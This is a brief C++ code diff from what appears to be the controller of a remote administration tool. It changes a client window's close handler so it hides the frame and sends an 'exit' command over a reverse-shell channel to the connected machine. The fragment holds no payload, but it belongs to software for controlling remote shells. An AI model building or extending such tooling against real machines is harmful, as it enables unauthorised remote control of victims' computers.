@@ -125,11 +125,16 @@ void FrameCliente::OnTest(wxCommandEvent& event) {
 }
 
 void FrameCliente::OnClose(wxCloseEvent& event) {
-    std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
-    strComando += CMD_DEL;
-    strComando += "exit\r\n";
-    p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
-    //setear estado en cliente para evitar error al tratar de cerrar el frame
+    int iIndex = p_Servidor->IndexOf(this->strClienteID);
+
+    if (iIndex != -1) {
+        p_Servidor->vc_Clientes[iIndex]->m_setFrameVisible(false);
+        std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
+        strComando += CMD_DEL;
+        strComando += "exit\r\n";
+        p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+    }
+
     event.Skip();
 }
 
